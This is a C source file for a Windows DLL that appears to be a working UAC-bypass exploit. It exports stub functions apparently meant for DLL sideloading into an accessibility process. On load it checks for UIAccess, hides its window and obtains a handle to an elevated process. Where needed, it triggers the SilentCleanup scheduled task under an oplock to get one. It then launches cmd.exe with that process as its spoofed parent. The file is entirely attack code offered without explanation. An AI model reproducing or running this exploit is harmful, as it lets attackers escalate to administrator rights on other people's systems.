#include <windows.h>

#include "oplock.h"

#define PAYLOAD_CMD L"cmd.exe"

__declspec(dllexport) void InitializeOSKSupport()
{
}

__declspec(dllexport) void UninitializeOSKSupport()
{
}

__declspec(dllexport) void DoMsCtfMonitor()
{
}

static BOOL CreateProcessWithParentW(WCHAR* cmdline, HANDLE parent, DWORD dwFlags, WORD wShow, PROCESS_INFORMATION* pi)
{
	SIZE_T ptsize = 0;
	STARTUPINFOEXW si = { 0 };
	LPPROC_THREAD_ATTRIBUTE_LIST ptal = NULL;
	BOOL ret = FALSE;

	if (!pi)
	{
		return FALSE;
	}
	InitializeProcThreadAttributeList(NULL, 1, 0, &ptsize);
	ptal = (LPPROC_THREAD_ATTRIBUTE_LIST)HeapAlloc(GetProcessHeap(), 0, ptsize);
	if (!ptal)
	{
		return FALSE;
	}
	memset(&si, 0, sizeof(si));
	si.StartupInfo.cb = sizeof(si);
	si.StartupInfo.dwFlags = STARTF_FORCEOFFFEEDBACK | STARTF_USESHOWWINDOW;
	si.StartupInfo.wShowWindow = wShow;
	if (!InitializeProcThreadAttributeList(ptal, 1, 0, &ptsize))
	{
		HeapFree(GetProcessHeap(), 0, ptal);
		return FALSE;
	}
	if (!UpdateProcThreadAttribute(ptal, 0, PROC_THREAD_ATTRIBUTE_PARENT_PROCESS, &parent, sizeof(HANDLE), NULL, NULL))
	{
		DeleteProcThreadAttributeList(ptal);
		HeapFree(GetProcessHeap(), 0, ptal);
		return FALSE;
	}
	si.lpAttributeList = ptal;
	ret = CreateProcessW(NULL, cmdline, NULL, NULL, FALSE, EXTENDED_STARTUPINFO_PRESENT | dwFlags, NULL, NULL, (STARTUPINFOW*)&si, pi);
	DeleteProcThreadAttributeList(ptal);
	HeapFree(GetProcessHeap(), 0, ptal);
	return ret;
}

typedef HANDLE (WINAPI* __GetProcessHandleFromHwnd)(HWND hwnd);

static HANDLE CallGetProcessHandleFromHwnd(HWND hwnd)
{
	HANDLE process = NULL;
	HMODULE oleacc = NULL;
	__GetProcessHandleFromHwnd _GetProcessHandleFromHwnd = NULL;

	oleacc = LoadLibraryW(L"oleacc.dll");
	if (oleacc)
	{
		_GetProcessHandleFromHwnd = (__GetProcessHandleFromHwnd)GetProcAddress(oleacc, "GetProcessHandleFromHwnd");
		if (_GetProcessHandleFromHwnd)
		{
			process = _GetProcessHandleFromHwnd(hwnd);
		}
		FreeLibrary(oleacc);
	}
	return process;
}

static HANDLE GetHwndFullProcessHandle(HWND hwnd)
{
	HANDLE process = NULL;
	HANDLE dup = NULL;

	process = CallGetProcessHandleFromHwnd(hwnd);
	if (!process)
	{
		return NULL;
	}
	if (!DuplicateHandle(process, (HANDLE)-1, (HANDLE)-1, &dup, 0, FALSE, DUPLICATE_SAME_ACCESS))
	{
		CloseHandle(process);
		return NULL;
	}
	CloseHandle(process);
	return dup;
}

static BOOL EnumElevatedProcessHandle(HWND hwnd, LPARAM lparam)
{
	DWORD pid = 0;
	HANDLE process = NULL;
	HANDLE token = NULL;
	DWORD elevtype = 0;
	DWORD retlen = 0;

	if (!lparam)
	{
		return FALSE;
	}
	GetWindowThreadProcessId(hwnd, &pid);
	if (!pid)
	{
		return TRUE;
	}
	process = OpenProcess(PROCESS_QUERY_LIMITED_INFORMATION, FALSE, pid);
	if (!process)
	{
		return TRUE;
	}
	if (!OpenProcessToken(process, MAXIMUM_ALLOWED, &token))
	{
		CloseHandle(process);
		return TRUE;
	}
	CloseHandle(process);
	retlen = 0;
	if (!GetTokenInformation(token, TokenElevationType, &elevtype, sizeof(elevtype), &retlen))
	{
		CloseHandle(token);
		return TRUE;
	}
	CloseHandle(token);
	if (elevtype != TokenElevationTypeFull)
	{
		return TRUE;
	}
	process = GetHwndFullProcessHandle(hwnd);
	if (process)
	{
		*(HANDLE*)lparam = process;
		return FALSE;
	}
	return TRUE;
}

static HANDLE FindFirstElevatedProcessHandle()
{
	HANDLE process = NULL;
	HWND hwnd = NULL;
	//EnumWindows((WNDENUMPROC)EnumElevatedProcessHandle, (LPARAM)&process);
	do
	{
		hwnd = FindWindowEx(HWND_MESSAGE, hwnd, NULL, NULL);
		if (hwnd)
		{
			if (!EnumElevatedProcessHandle(hwnd, (LPARAM)&process))
			{
				break;
			}
		}
	} while (hwnd);
	if (!hwnd)
	{
		do
		{
			hwnd = FindWindowEx(NULL, hwnd, NULL, NULL);
			if (hwnd)
			{
				if (!EnumElevatedProcessHandle(hwnd, (LPARAM)&process))
				{
					break;
				}
			}
		} while (hwnd);
	}
	return process;
}

static BOOL CheckUIAccessPermissions()
{
	HANDLE token = NULL;
	BYTE tmlbuf[sizeof(TOKEN_MANDATORY_LABEL) + sizeof(SID)] = { 0 };
	TOKEN_MANDATORY_LABEL* tml = (TOKEN_MANDATORY_LABEL*)&tmlbuf[0];
	DWORD uiaccess = 0;
	DWORD* integrity = NULL;
	DWORD retlen = 0;

	if (!OpenProcessToken((HANDLE)-1, MAXIMUM_ALLOWED, &token))
	{
		return FALSE;
	}
	retlen = sizeof(uiaccess);
	if (!GetTokenInformation(token, TokenUIAccess, &uiaccess, sizeof(uiaccess), &retlen))
	{
		CloseHandle(token);
		return FALSE;
	}
	if (!uiaccess)
	{
		CloseHandle(token);
		return FALSE;
	}
	retlen = sizeof(tmlbuf);
	if (!GetTokenInformation(token, TokenIntegrityLevel, tml, retlen, &retlen))
	{
		CloseHandle(token);
		return FALSE;
	}
	integrity = GetSidSubAuthority(tml->Label.Sid, 0);
	if (*integrity < 0x3000)
	{
		CloseHandle(token);
		return FALSE;
	}
	CloseHandle(token);
	return TRUE;
}

static BOOL StartBackupLockedElevatedProcess()
{
	WCHAR task_cmdline[200] = { 0 };
	PROCESS_INFORMATION pi = { 0 };
	STARTUPINFOW si = { 0 };
	DWORD exitcode = 1;
	WCHAR winpath[100] = { 0 };

	if (!GetSystemWindowsDirectoryW(winpath, 70))
	{
		return FALSE;
	}
	lstrcpyW(task_cmdline, winpath);
	lstrcatW(task_cmdline, L"\\System32\\schtasks.exe /RUN /TN \"\\Microsoft\\Windows\\DiskCleanup\\SilentCleanup\" /I");
	SetEnvironmentVariableW(L"windir", winpath);
	SetEnvironmentVariableW(L"SystemRoot", winpath);
	memset(&pi, 0, sizeof(pi));
	memset(&si, 0, sizeof(si));
	si.cb = sizeof(si);
	si.dwFlags = STARTF_FORCEOFFFEEDBACK | STARTF_USESHOWWINDOW;
	si.wShowWindow = SW_HIDE;
	if (!CreateProcessW(NULL, task_cmdline, NULL, NULL, FALSE, CREATE_NEW_CONSOLE, NULL, NULL, &si, &pi))
	{
		return FALSE;
	}
	CloseHandle(pi.hThread);
	WaitForSingleObject(pi.hProcess, 3000);
	if (!GetExitCodeProcess(pi.hProcess, &exitcode))
	{
		CloseHandle(pi.hProcess);
		return FALSE;
	}
	CloseHandle(pi.hProcess);
	if (exitcode)
	{
		return FALSE;
	}
	return TRUE;
}

static BOOL StartElevatedCmd()
{
	HANDLE process = NULL;
	PROCESS_INFORMATION pi = { 0 };
	WCHAR cmdline[] = PAYLOAD_CMD;
	BOOL ret = FALSE;
	int i = 0;
	OPLOCK_FILE_CONTEXT ofc = { 0 };
	WCHAR oplock_path[MAX_PATH] = { 0 };
	HANDLE file = INVALID_HANDLE_VALUE;

	if (GetEnvironmentVariableW(L"USERPROFILE", oplock_path, 200))
	{
		lstrcatW(oplock_path, L"\\Documents\\desktop.ini");
		file = CreateFileW(oplock_path, GENERIC_READ, FILE_SHARE_READ | FILE_SHARE_WRITE | FILE_SHARE_DELETE, NULL, OPEN_ALWAYS, FILE_ATTRIBUTE_NORMAL, NULL);
		if (file != INVALID_HANDLE_VALUE)
		{
			CloseHandle(file);
		}
		else
		{
			oplock_path[0] = L'\0';
		}
	}
	else
	{
		oplock_path[0] = L'\0';
	}
	process = FindFirstElevatedProcessHandle();
	if (!process)
	{
		if (oplock_path[0])
		{
			memset(&ofc, 0, sizeof(ofc));
			ofc.len = sizeof(ofc);
			ofc.file = INVALID_HANDLE_VALUE;
			OpLockFile(oplock_path, GENERIC_READ, FILE_SHARE_READ | FILE_SHARE_WRITE | FILE_SHARE_DELETE, TRUE, &ofc);
		}
		if (StartBackupLockedElevatedProcess())
		{
			for (i = 0; i < 5000; i += 50)
			{
				process = FindFirstElevatedProcessHandle();
				if (process)
				{
					break;
				}
				Sleep(50);
			}
		}
		if (ofc.file != INVALID_HANDLE_VALUE)
		{
			ReleaseOpLock(&ofc);
		}
	}
	if (process)
	{
		memset(&pi, 0, sizeof(pi));
		ret = CreateProcessWithParentW(cmdline, process, CREATE_NEW_CONSOLE, SW_SHOW, &pi);
		if (ret)
		{
			CloseHandle(pi.hThread);
			CloseHandle(pi.hProcess);
		}
		CloseHandle(process);
	}
	return ret;
}

static BOOL HideMainWindowCallback(HWND hwnd, LPARAM lparam)
{
	DWORD pid = 0;
	HANDLE process = NULL;
	HANDLE token = NULL;
	DWORD elevtype = 0;
	DWORD retlen = 0;

	GetWindowThreadProcessId(hwnd, &pid);
	if (!pid)
	{
		return TRUE;
	}
	if (GetCurrentProcessId() != pid)
	{
		return TRUE;
	}
	if (GetWindow(hwnd, GW_OWNER))
	{
		return TRUE;
	}
	if (!IsWindowVisible(hwnd))
	{
		return TRUE;
	}
	ShowWindow(hwnd, SW_HIDE);
	return TRUE;
}

static void HideMainWindow()
{
	EnumWindows((WNDENUMPROC)HideMainWindowCallback, 0);
}

BOOL APIENTRY DllMain(HMODULE hModule, DWORD ul_reason_for_call, LPVOID lpReserved)
{
	UINT exitcode = 0;

    switch (ul_reason_for_call)
    {
    case DLL_PROCESS_ATTACH:
		if (CheckUIAccessPermissions())
		{
			HideMainWindow();
			exitcode = !StartElevatedCmd();
			ExitProcess(exitcode);
		}
        break;
    case DLL_THREAD_ATTACH:
        break;
    case DLL_THREAD_DETACH:
        break;
    case DLL_PROCESS_DETACH:
        break;
    }
    return TRUE;
}
